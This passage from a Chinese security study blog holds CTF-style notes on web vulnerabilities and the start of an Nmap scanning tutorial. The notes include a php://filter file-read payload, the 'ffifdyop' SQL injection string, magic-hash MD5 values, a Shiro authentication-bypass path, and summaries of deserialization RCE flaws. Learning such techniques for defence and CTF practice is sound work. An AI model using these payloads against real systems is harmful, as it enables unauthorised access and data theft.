1.2.4"></a>CVE-2016-4437 Apache Shiro 1.2.4反序列化漏洞 Apache Shiro &lt;= 1.2.4</h4><p>Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt;  Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p><h4 id="CVE-2019-12086-jackson-databind任意文件读取漏洞"><a href="#CVE-2019-12086-jackson-databind任意文件读取漏洞" class="headerlink" title="CVE-2019-12086 jackson-databind任意文件读取漏洞"></a>CVE-2019-12086 jackson-databind任意文件读取漏洞</h4><p>在开启Default Typing的情况下，且classpath中存在mysql-connector-java 8.0.15版本（2019.2.1发布）以下，攻击者可以通过发送恶意json数据读取任意文件。mysql-connector-java这个库就是连接数据库时常用的mysql jdbc。</p><h4 id="Java序列化流量特征"><a href="#Java序列化流量特征" class="headerlink" title="Java序列化流量特征"></a>Java序列化流量特征</h4><p>特征一<br>参考特征，反序列化数据看起来就是这个样子: sr 、类名、空白字符<br>特征二<br>固有特征，是Java的序列化数据就一定是这样，如果是base64编码的，就是以rO0A开头的。<br>特征三<br>参考特征，有些content-type就说明了它是是序列化数据。</p><h4 id="java-反序列化-ysoserial-exploit-JRMPClient"><a href="#java-反序列化-ysoserial-exploit-JRMPClient" class="headerlink" title="java 反序列化 ysoserial exploit/JRMPClient"></a>java 反序列化 ysoserial exploit/JRMPClient</h4><p>ysoserial中的exploit/JRMPClient是作为攻击方的代码，一般会结合payloads/JRMPLIstener使用，攻击流程就是：<br>1、先往存在漏洞的服务器发送payloads/JRMPLIstener，使服务器反序列化该payload后，会开启一个rmi服务并监听在设置的端口<br>2、然后攻击方在自己的服务器使用exploit/JRMPClient与存在漏洞的服务器进行通信，并且发送一个可命令执行的payload（假如存在漏洞的服务器中有使用org.apacje.commons.collections包，则可以发送CommonsCollections系列的payload），从而达到命令执行的结果。</p><h4 id="0e开头的md5和原值："><a href="#0e开头的md5和原值：" class="headerlink" title="0e开头的md5和原值："></a>0e开头的md5和原值：</h4><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs dns">s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br>s155964671a<br><span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br>s1091221200a<br><span class="hljs-number">0</span>e9406242178565615578<span class="hljs-number">16327384675</span><br>s1885207154a<br><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br>s1502113478a<br><span class="hljs-number">0</span>e8615801632915612474<span class="hljs-number">04381396064</span><br>s1885207154a<br><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br>s1836677006a<br><span class="hljs-number">0</span>e4810364908676611132<span class="hljs-number">60034900752</span><br>s155964671a<br><span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br>s1184209335a<br><span class="hljs-number">0</span>e072485820392773389<span class="hljs-number">523109082030</span><br>s1665632922a<br><span class="hljs-number">0</span>e731198061491163073<span class="hljs-number">197128363787</span><br>s1502113478a<br><span class="hljs-number">0</span>e8615801632915612474<span class="hljs-number">04381396064</span><br>s1836677006a<br><span class="hljs-number">0</span>e4810364908676611132<span class="hljs-number">60034900752</span><br>s1091221200a<br><span class="hljs-number">0</span>e9406242178565615578<span class="hljs-number">16327384675</span><br>s155964671a<br><span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br>s1502113478a<br><span class="hljs-number">0</span>e8615801632915612474<span class="hljs-number">04381396064</span><br>s155964671a<br><span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br>s1665632922a<br><span class="hljs-number">0</span>e731198061491163073<span class="hljs-number">197128363787</span><br>s155964671a<br><span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br>s1091221200a<br><span class="hljs-number">0</span>e9406242178565615578<span class="hljs-number">16327384675</span><br>s1836677006a<br><span class="hljs-number">0</span>e4810364908676611132<span class="hljs-number">60034900752</span><br>s1885207154a<br><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br>s532378020a<br><span class="hljs-number">0</span>e220463095855511507<span class="hljs-number">588041205815</span><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br>s1091221200a<br><span class="hljs-number">0</span>e9406242178565615578<span class="hljs-number">16327384675</span><br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br>s1502113478a<br><span class="hljs-number">0</span>e8615801632915612474<span class="hljs-number">04381396064</span><br>s1091221200a<br><span class="hljs-number">0</span>e9406242178565615578<span class="hljs-number">16327384675</span><br>s1665632922a<br><span class="hljs-number">0</span>e731198061491163073<span class="hljs-number">197128363787</span><br>s1885207154a<br><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br>s1836677006a<br><span class="hljs-number">0</span>e4810364908676611132<span class="hljs-number">60034900752</span><br>s1665632922a<br><span class="hljs-number">0</span>e731198061491163073<span class="hljs-number">197128363787</span><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br></code></pre></td></tr></table></figure><h4 id="使用dig和host命令以及读取DNS-TXT记录"><a href="#使用dig和host命令以及读取DNS-TXT记录" class="headerlink" title="使用dig和host命令以及读取DNS TXT记录"></a>使用dig和host命令以及读取DNS TXT记录</h4><h4 id="绕过require-once"><a href="#绕过require-once" class="headerlink" title="绕过require_once"></a>绕过require_once</h4><p><code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><h4 id="flask-caching-RCE"><a href="#flask-caching-RCE" class="headerlink" title="flask_caching RCE"></a>flask_caching RCE</h4><p>flask_caching使用pickle序列化对象并在将其从缓存中拉出时反序列化它们，因此可以用作RCE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># From flask_caching/backends/rediscache.py</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_object</span>(<span class="hljs-params">self, value</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;The reversal of :meth:`dump_object`.  This might be called with</span><br><span class="hljs-string">    None.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">if</span> value.startswith(<span class="hljs-string">b&quot;!&quot;</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> pickle.loads(value[<span class="hljs-number">1</span>:])<br>        <span class="hljs-keyword">except</span> pickle.PickleError:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(value)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-comment"># before 0.8 we did not have serialization.  Still support that.</span><br>        <span class="hljs-keyword">return</span> value<br></code></pre></td></tr></table></figure><h4 id="TURN-sever-CSAW-CTF-Web-Real-Time-Chat"><a href="#TURN-sever-CSAW-CTF-Web-Real-Time-Chat" class="headerlink" title="TURN sever - CSAW CTF Web Real Time Chat"></a>TURN sever - CSAW CTF Web Real Time Chat</h4><p>TURN服务器允许将TCP连接和UDP数据包代理到内部网络。这使攻击者能够扫描内部系统并与之交互。</p><h4 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h4><p>查询DNS包括NS记录，A记录，MX记录等相关信息的工具。</p><h4 id="tac命令"><a href="#tac命令" class="headerlink" title="tac命令"></a>tac命令</h4><p>反序输出文件的内容，文件的最后一行显示在第一行</p><p>它可以对调试日志文件提供了很大的帮助，扭转日志内容的时间顺序。</p><h4 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h4><p>经过md5加密后：276f722736c95d99e921722cf9ed621c</p><p>再转换为字符串：’or’6&lt;乱码&gt; 即  <code>&#39;or&#39;66�]��!r,��b</code></p><p>用途：</p><p>select * from admin where password=’’or’6&lt;乱码&gt;’</p><p>就相当于select * from admin where password=’’or 1 实现sql注入</p><h4 id="安全策略-frame-ancestors-会覆盖-‘X-Frame-Options’-‘sameorigin’-导致同源策略失效，可以使用-iframe"><a href="#安全策略-frame-ancestors-会覆盖-‘X-Frame-Options’-‘sameorigin’-导致同源策略失效，可以使用-iframe" class="headerlink" title="安全策略 frame-ancestors 会覆盖 [‘X-Frame-Options’] = ‘sameorigin’ 导致同源策略失效，可以使用 iframe"></a>安全策略 frame-ancestors 会覆盖 [‘X-Frame-Options’] = ‘sameorigin’ 导致同源策略失效，可以使用 iframe</h4><h4 id="Feature-Policy响应头提供了一种可以在本页面或包含的iframe上启用或禁止浏览器特性的机制。"><a href="#Feature-Policy响应头提供了一种可以在本页面或包含的iframe上启用或禁止浏览器特性的机制。" class="headerlink" title="Feature-Policy响应头提供了一种可以在本页面或包含的iframe上启用或禁止浏览器特性的机制。"></a>Feature-Policy响应头提供了一种可以在本页面或包含的iframe上启用或禁止浏览器特性的机制。</h4><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-string">&#x27;a&#x27;</span>           =&gt; shell<br><span class="hljs-string">&#x27;a&#x27;</span>.length       =&gt; js<br>len(<span class="hljs-string">&#x27;a&#x27;</span>)         =&gt; python<br><span class="hljs-string">&#x27;a&#x27;</span>.charAt(<span class="hljs-number">0</span>)    =&gt; java<br></code></pre></td></tr></table></figure><h4 id="CVE-2020-11989-Apache-Shiro权限绕过漏洞"><a href="#CVE-2020-11989-Apache-Shiro权限绕过漏洞" class="headerlink" title="CVE-2020-11989 Apache Shiro权限绕过漏洞"></a>CVE-2020-11989 Apache Shiro权限绕过漏洞</h4><p>如果直接访问 <code>/test/admin/page</code> ，会返回302跳转要求登录</p><p>但是访问 <code>/;/test/admin/page</code> , 就能直接绕过Shiro权限验证，访问到/admin路由中的信息</p><h4 id="CVE-2020-28949、CVE-2020-28948-Drupal-远程代码执行漏洞"><a href="#CVE-2020-28949、CVE-2020-28948-Drupal-远程代码执行漏洞" class="headerlink" title="CVE-2020-28949、CVE-2020-28948 Drupal 远程代码执行漏洞"></a>CVE-2020-28949、CVE-2020-28948 Drupal 远程代码执行漏洞</h4><p>Drupal使用了PEAR Archive_Tar作为依赖库，在处理如.tar、.tar.gz、.bz2或.tlz等格式的压缩包时，由于过滤不严，可能导致存在PHAR反序列化漏洞，从而造成远程代码执行，影响版本：Drupal 9.0 : Drupal &lt; 9.0.9，Drupal 8.9 : Drupal &lt; 8.9.10，Drupal 8.8 : Drupal &lt; 8.8.12，Drupal 7 : Drupal &lt; 7.75</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmap</title>
    <link href="/2020/10/31/Nmap/"/>
    <url>/2020/10/31/Nmap/</url>
    
    <content type="html"><![CDATA[<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><h4 id="Nmap基本指令"><a href="#Nmap基本指令" class="headerlink" title="Nmap基本指令"></a>Nmap基本指令</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-number">1</span>、nmap简单扫描<br>nmap默认发送一个ARP的PING数据包，来探测目标主机<span class="hljs-number">1</span>-<span class="hljs-number">10000</span>范围内所开放的所有端口<br>命令语法： <br>nmap &lt;target ip address&gt;<br>其中：target ip address是扫描的目标主机的ip地址<br>例子:nmap <span class="hljs-number">173.22</span><span class="hljs-number">.90</span><span class="hljs-number">.10</span><br>[<span class="hljs-symbol">root@</span>docker-node4 ~]# nmap <span class="hljs-number">173.22</span><span class="hljs-number">.90</span><span class="hljs-number">.10</span><br>PORT    STATE SERVICE<br><span class="hljs-number">22</span>/tcp  <span class="hljs-keyword">open</span>  ssh <br><span class="hljs-number">80</span>/tcp  <span class="hljs-keyword">open</span>  http<br><span class="hljs-number">111</span>/tcp <span class="hljs-keyword">open</span>  rpcbind<br>扫描出开放的端口<br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">2</span>、nmap简单扫描，并对结果返回详细的描述输出<br>命令语法：namp -vv &lt;target ip address&gt;<br>介绍：-vv参数设置对结果的详细输出<br>例子：nmap -vv    <span class="hljs-number">173.22</span><span class="hljs-number">.90</span><span class="hljs-number">.10</span><br>效果如下：<br>[<span class="hljs-meta">root@docker-node4 ~</span>]<span class="hljs-meta"># nmap -vv 173.22.90.10</span><br>Starting Nmap <span class="hljs-number">6.40</span> ( http:<span class="hljs-comment">//nmap.org ) at 2019-08-18 04:48 CST</span><br>Initiating ARP Ping Scan at <span class="hljs-number">04</span>:<span class="hljs-number">48</span><br>Scanning <span class="hljs-number">173.22</span><span class="hljs-number">.90</span><span class="hljs-number">.10</span> [<span class="hljs-number">1</span> port]<br>Completed ARP Ping Scan at <span class="hljs-number">04</span>:<span class="hljs-number">48</span>, <span class="hljs-number">0.01</span><span class="hljs-function">s <span class="hljs-title">elapsed</span> (<span class="hljs-params"><span class="hljs-number">1</span> total hosts</span>)</span><br><span class="hljs-function">Initiating Parallel DNS resolution of 1 host. at 04:48</span><br><span class="hljs-function">Completed Parallel DNS resolution of 1 host. at 04:48, 6.53s elapsed</span><br><span class="hljs-function">Initiating SYN Stealth Scan at 04:48</span><br><span class="hljs-function">Scanning 173-22-90-10.client.mchsi.<span class="hljs-title">com</span> (<span class="hljs-params"><span class="hljs-number">173.22</span><span class="hljs-number">.90</span><span class="hljs-number">.10</span></span>) [1000 ports]</span><br><span class="hljs-function">Discovered open port 111/tcp <span class="hljs-keyword">on</span> 173.22.90.10</span><br><span class="hljs-function">Discovered open port 80/tcp <span class="hljs-keyword">on</span> 173.22.90.10</span><br><span class="hljs-function">Discovered open port 22/tcp <span class="hljs-keyword">on</span> 173.22.90.10</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">3、<span class="hljs-selector-tag">nmap</span>自定义扫描<br>命令语法：<span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-p</span>(<span class="hljs-selector-tag">range</span>) &lt;<span class="hljs-selector-tag">target</span> <span class="hljs-selector-tag">IP</span>&gt;<br>介绍：（<span class="hljs-selector-tag">range</span>）为要扫描的端口范围，端口大小不能超过65535<br>例子：扫描目标主机的20<span class="hljs-selector-tag">-120</span>号端口<br> <span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-p20-120</span> 173.22.90.10<br></code></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-number">4</span>、nmap 指定端口扫描<br>命令语法：nmap -p(port1,port2,…) &lt;target IP&gt;<br>介绍：port1,port2…为想要扫描的端口号<br>例子：扫描目标主机的<span class="hljs-number">80</span>，<span class="hljs-number">22</span>端口<br>[<span class="hljs-symbol">root@</span>docker-node4 ~]# nmap -p22,<span class="hljs-number">80</span> <span class="hljs-number">173.22</span><span class="hljs-number">.90</span><span class="hljs-number">.10</span><br>Starting Nmap <span class="hljs-number">6.40</span> ( http:<span class="hljs-comment">//nmap.org ) at 2019-08-18 04:57 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">173</span>-<span class="hljs-number">22</span>-<span class="hljs-number">90</span>-<span class="hljs-number">10.</span>client.mchsi.com (<span class="hljs-number">173.22</span><span class="hljs-number">.90</span><span class="hljs-number">.10</span>)<br>Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.</span>00032s latency).<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http<br>MAC Address: <span class="hljs-number">00</span>:0C:<span class="hljs-number">29</span>:CF:A7:<span class="hljs-number">30</span> (VMware)<br></code></pre></td></tr></table></figure><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-number">5</span>、nmap ping 扫描<br>nmap可以利用类似windows/linux系统下的ping 方式进行扫描<br>命令语法： nmap -sP &lt;target ip&gt;<br>例子：nmap sP <span class="hljs-number">10.1</span><span class="hljs-number">.112</span><span class="hljs-number">.89</span><br>[root<span class="hljs-meta">@docker</span>-node4 ~]# nmap -sP <span class="hljs-number">173.22</span><span class="hljs-number">.90</span><span class="hljs-number">.10</span>  扫描存活的主机,这个机器存活<br>Starting Nmap <span class="hljs-number">6.40</span> ( http:<span class="hljs-comment">//nmap.org ) at 2019-08-18 05:00 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">173</span><span class="hljs-number">-22</span><span class="hljs-number">-90</span><span class="hljs-number">-10.</span>client.mchsi.com (<span class="hljs-number">173.22</span><span class="hljs-number">.90</span><span class="hljs-number">.10</span>)<br>Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.00048</span>s latency).<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:CF:A7:<span class="hljs-number">30</span> (VMware)<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">6.77</span> seconds<br><br>[root<span class="hljs-meta">@docker</span>-node4 ~]# nmap -sP <span class="hljs-number">173.22</span><span class="hljs-number">.90</span><span class="hljs-number">.16</span>  <br>Starting Nmap <span class="hljs-number">6.40</span> ( http:<span class="hljs-comment">//nmap.org ) at 2019-08-18 05:00 CST</span><br>Note: Host seems down. If it <span class="hljs-keyword">is</span> really up, but blocking our ping probes, <span class="hljs-keyword">try</span> -Pn<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">0</span> hosts up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.43</span> seconds<br>这个就是显示不是存活状态的主机,没有ping成功<br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">6</span>、nmap 路由跟踪<br>路由器追踪功能，能够帮助网络管理员了解网络通行情况，同时也是网络管理人员很好的辅助工具，通过路由器追踪可以轻松的查处从我们电脑所在地到目的地之间所经常的网络节点，并可以看到通过各个结点所花费的时间<br>命令语法： <br>nmap –traceroute &lt;target IP&gt;<br>例子:namp –traceroute <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>(geogle dns服务器ip)<br>[<span class="hljs-meta">root@docker-node4 ~</span>]<span class="hljs-meta"># nmap --traceroute 8.8.8.8</span><br>Starting Nmap <span class="hljs-number">6.40</span> ( http:<span class="hljs-comment">//nmap.org ) at 2019-08-18 05:04 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> dns.google (<span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>)<br><span class="hljs-function">Host <span class="hljs-keyword">is</span> <span class="hljs-title">up</span> (<span class="hljs-params"><span class="hljs-number">0.045</span>s latency</span>).</span><br><span class="hljs-function">Not shown: 999 filtered ports</span><br><span class="hljs-function">PORT   STATE SERVICE</span><br><span class="hljs-function">53/tcp open  domain</span><br><span class="hljs-function"><span class="hljs-title">TRACEROUTE</span> (<span class="hljs-params"><span class="hljs-keyword">using</span> port <span class="hljs-number">53</span>/tcp</span>)</span><br><span class="hljs-function">HOP RTT      ADDRESS</span><br><span class="hljs-function">1   2.77 ms  192.168.1.1</span><br><span class="hljs-function">2   5.63 ms  113.45.32.1</span><br><span class="hljs-function">3   6.26 ms  124.205.97.50</span><br><span class="hljs-function">4   6.31 ms  124.205.97.50</span><br><span class="hljs-function">5   6.41 ms  218.241.165.41</span><br><span class="hljs-function">6   8.75 ms  124.205.98.41</span><br><span class="hljs-function">7   6.52 ms  202.99.1.173</span><br><span class="hljs-function">8   6.58 ms  218.241.244.98</span><br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">7</span>、nmap设置扫描一个网段下的ip<br>命令语法： <br>nmap -sP &lt;network address&gt; &lt;/CIDR&gt;<br>介绍：CIDR为设置的子网掩码（/<span class="hljs-number">24</span>,/<span class="hljs-number">16</span>,/<span class="hljs-number">8</span>等）<br>例子：nmap -sP <span class="hljs-number">10.1</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span> /<span class="hljs-number">24</span><br>[<span class="hljs-meta">root@docker-node4 ~</span>]<span class="hljs-meta"># nmap -sP 192.168.1.1 /24</span><br>Starting Nmap <span class="hljs-number">6.40</span> ( http:<span class="hljs-comment">//nmap.org ) at 2019-08-18 05:11 CST</span><br>Failed to resolve <span class="hljs-string">&quot;&quot;</span>.<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br><span class="hljs-function">Host <span class="hljs-keyword">is</span> <span class="hljs-title">up</span> (<span class="hljs-params"><span class="hljs-number">0.0061</span>s latency</span>).</span><br><span class="hljs-function">MAC Address: B0:95:8E:5F:98:85 (<span class="hljs-params">Unknown</span>)</span><br><span class="hljs-function">Nmap done: 1 IP <span class="hljs-title">address</span> (<span class="hljs-params"><span class="hljs-number">1</span> host up</span>) scanned <span class="hljs-keyword">in</span> 13.04 seconds</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">8、<span class="hljs-selector-tag">nmap</span> 操作系统类型的探测<br>命令语法： <br><span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-0</span> &lt;<span class="hljs-selector-tag">target</span> <span class="hljs-selector-tag">IP</span>&gt;<br>例子：<span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-O</span>(大写的<span class="hljs-selector-tag">o</span>) 10.1.112.89<br>效果： <br><span class="hljs-selector-attr">[root@docker-node4 ~]</span>#  <span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-O</span> 192.168.1.103<br><span class="hljs-selector-tag">Running</span> (<span class="hljs-selector-tag">JUST</span> <span class="hljs-selector-tag">GUESSING</span>): <span class="hljs-selector-tag">AVtech</span> <span class="hljs-selector-tag">embedded</span> (87%), <span class="hljs-selector-tag">FreeBSD</span> 6<span class="hljs-selector-class">.X</span> (86%), <span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">XP</span> (85%)<br>扫描出是<span class="hljs-selector-tag">windows</span>的系统<br>不过不准确我的这个是<span class="hljs-selector-tag">windows10</span>的系统<br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 